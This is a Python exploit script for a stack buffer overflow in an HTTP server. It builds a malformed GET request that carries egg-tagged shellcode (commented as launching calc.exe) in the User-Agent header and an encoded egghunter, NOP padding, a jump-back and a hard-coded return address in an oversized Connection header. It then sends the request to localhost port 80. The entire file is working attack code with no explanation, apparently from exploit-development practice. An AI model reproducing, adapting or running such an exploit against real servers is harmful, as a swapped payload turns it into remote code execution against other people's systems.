import socket
import struct

# calc.exe
shellcode =  "w00tw00t"	 # egg
shellcode += (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd" 
)

egghunter =  ""
egghunter += "\x89\xe5\xdd\xc3\xd9\x75\xf4\x5f\x57\x59\x49\x49"
egghunter += "\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
egghunter += "\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
egghunter += "\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
egghunter += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
egghunter += "\x55\x36\x6e\x61\x58\x4a\x4b\x4f\x56\x6f\x72\x62"
egghunter += "\x46\x32\x50\x6a\x56\x62\x72\x78\x6e\x63\x59\x50"
egghunter += "\x44\x6e\x7a\x30\x43\x6a\x74\x34\x58\x6f\x48\x38"
egghunter += "\x63\x47\x36\x50\x70\x30\x71\x64\x4c\x4b\x58\x7a"
egghunter += "\x4e\x4f\x71\x65\x6a\x4a\x6c\x6f\x73\x45\x69\x77"
egghunter += "\x4b\x4f\x6b\x57\x41\x41"

magic =  "GET index.html HTTP/1.1\r\n"
magic += "User-Agent: " + shellcode + "\r\n"
magic += "Connection: "
magic += "\x90" * (2280 - len(egghunter))
magic += egghunter
magic += "\xEB\x80\x90\x90"  # jump back 0x80 bytes
magic += struct.pack("I", 0x6fc4d724)
magic += "\x90" * 52
magic += "\r\n\r\n"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1", 80))
s.send(magic)
